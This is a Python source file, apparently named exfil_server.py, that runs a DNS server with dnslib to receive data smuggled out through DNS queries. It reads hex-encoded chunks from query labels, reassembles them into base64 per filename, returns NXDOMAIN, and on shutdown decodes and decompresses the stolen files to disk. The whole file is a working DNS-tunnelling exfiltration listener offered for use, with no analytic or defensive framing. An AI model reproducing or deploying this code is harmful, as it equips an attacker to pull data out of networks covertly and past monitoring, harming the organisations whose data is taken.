from dnslib import DNSRecord
from dnslib.server import DNSServer, DNSHandler, BaseResolver
import base64
from datetime import datetime
import binascii
import gzip

class DataResolver(BaseResolver):
    def __init__(self):
        self.data_store = {}  # Dictionary to store data chunks by filename

    def resolve(self, request, handler):
        qname = request.q.qname
        labels = str(qname).split('.')

        if len(labels) >= 4:
            domain_len = 2-len(labels)
            print(domain_len)
            filename = '_'.join(labels[domain_len:]) + "data.bin"
        else:
            filename = "data.bin"

        if filename not in self.data_store:
            self.data_store[filename] = bytearray()

        try:
            hex_data = labels[0].replace('-', '')+labels[1].replace('-', '')
            base64_chunk = binascii.unhexlify(hex_data).decode()
            self.data_store[filename].extend(base64_chunk.encode())
        except (binascii.Error, ValueError):
            pass

        # Simulate an NXDOMAIN response
        reply = request.reply()
        reply.header.rcode = 3
        return reply

    def write_data_to_file(self):
        for filename, data in self.data_store.items():
            if data:
                try:
                    now = datetime.now()
                    timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")

                    output_b64file = f"{timestamp}_{filename}.b64"
                    with open(output_b64file, 'wb') as f:
                        f.write(data)
                    
                    output_file = f"{timestamp}_{filename}"
                    decoded_data = base64.b64decode(data)
                    
                    # Check if the file is gzipped by checking the first two bytes (gzip magic number)
                    if decoded_data[:2] == b'\x1f\x8b':
                        output_file += ".gz"
                        with open(output_file, 'wb') as f:
                            f.write(decoded_data)
                        with gzip.open(output_file, 'rb') as gz_file:
                            decompressed_data = gz_file.read()
                        decompressed_output_file = output_file[:-3]  # Remove .gz extension
                        with open(decompressed_output_file, 'wb') as f:
                            f.write(decompressed_data)
                        print(f"Data written to {decompressed_output_file}")
                    else:
                        with open(output_file, 'wb') as f:
                            f.write(decoded_data)
                        print(f"Data written to {output_file}")
                except (binascii.Error, ValueError):
                    print(f"Failed to decode base64 data for {output_file}")

if __name__ == "__main__":
    import sys

    if len(sys.argv) != 2:
        print("Usage: python3 exfil_server.py <dns_server_ip>")
        sys.exit(1)

    dns_server_ip = sys.argv[1]
    resolver = DataResolver()
    server = DNSServer(resolver, port=53, address=dns_server_ip, tcp=False)

    try:
        server.start_thread()
        print("DNS server started. Press Ctrl+C to stop.")
        while True:
            pass
    except KeyboardInterrupt:
        print("Stopping server...")
        resolver.write_data_to_file()
        server.stop()
